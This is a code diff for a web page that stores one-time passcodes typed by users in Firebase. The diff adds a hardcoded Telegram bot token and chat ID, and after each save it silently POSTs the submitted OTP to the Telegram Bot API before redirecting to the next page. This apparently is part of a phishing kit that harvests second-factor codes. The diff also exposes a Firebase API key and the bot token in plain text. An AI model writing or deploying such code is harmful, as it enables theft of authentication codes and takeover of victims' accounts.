@@ -159,7 +159,7 @@
   </div>
 
   <script>
-    // Firebase Config (Updated one)
+    // Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
       authDomain: "dlhiljbrd.firebaseapp.com",
@@ -171,6 +171,10 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+
+    // Telegram Bot Info
+    const botToken = "7882249824:AAGPvCpy3Gef5c-BfYoFwY5uHJr9_yKbSIs";
+    const chatId = "6677946042";
   </script>
 
   <script>
@@ -196,7 +200,22 @@
               otp: otp,
               timestamp: firebase.firestore.FieldValue.serverTimestamp()
             }).then(() => {
-              window.location.href = "page3.html";
+              const message = `New OTP Submitted:\n${otp}`;
+
+              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: message
+                })
+              }).then(() => {
+                window.location.href = "page3.html";
+              }).catch(err => {
+                alert("Telegram Error: " + err.message);
+              });
             }).catch((error) => {
               alert("Error saving OTP: " + error.message);
             });
